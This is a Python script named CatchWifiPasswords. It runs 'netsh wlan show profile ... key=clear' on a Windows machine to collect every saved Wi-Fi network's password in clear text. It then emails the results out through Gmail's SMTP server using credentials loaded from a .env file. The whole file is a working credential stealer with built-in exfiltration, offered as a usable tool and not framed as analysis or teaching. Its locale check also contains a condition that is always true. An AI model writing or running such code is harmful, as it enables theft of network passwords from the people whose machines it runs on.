from smtplib import SMTP
from typing import List
from colorama import (  # type: ignore
    Fore,
    init
)
import subprocess
import locale
import dotenv
import os
import re


class CatchWifiPasswords(object):

    def __init__(self, email: str, password: str, /) -> None:
        self.email: str = email
        self.password: str = password

    def send_mail(self, message: bytes, /) -> None:
        with SMTP("smtp.gmail.com", 587) as server:
            try:
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, message)
                print(f"{Fore.GREEN}[+] ALL PASSWORDS WERE SENT")
            except Exception as e:
                print(f"{Fore.RED}[-] ERROR: {e}")

    def get_all_wifi_passwords(self, network_names: List[bytes], /) -> None:
        result: bytes = b""
        for network_name in network_names:
            command: str = f"netsh wlan show profile {network_name.rstrip().decode()} key=clear"
            current_result: bytes = subprocess.check_output(command, shell=True)
            result += current_result
        self.send_mail(result)

    def run(self, /) -> None:
        command: str = "netsh wlan show profile"
        networks: bytes = subprocess.check_output(command, shell=True)

        if "pt_BR" in locale.getlocale():
            network_names = re.findall(b"(?:Usu\xa0rios\s*:\s)(.*)", networks)
            self.get_all_wifi_passwords(network_names)
        elif "English_United States" or "es_ES" in locale.getlocale():
            network_names = re.findall(b"(?:Profile\s*:\s)(.*)", networks)
            self.get_all_wifi_passwords(network_names)
        else:
            print(f"{Fore.RED}[-] YOUR COMPUTER LANGUAGE IS DIFFERENT FROM PT-BR OR EN-US...")


def main() -> None:
    dotenv.load_dotenv()
    EMAIL = os.getenv('EMAIL')
    PASSWORD = os.getenv('PASSWORD')
    catch: CatchWifiPasswords = CatchWifiPasswords(str(EMAIL), str(PASSWORD))
    catch.run()


if __name__ == "__main__":
    init(autoreset=True)
    main()
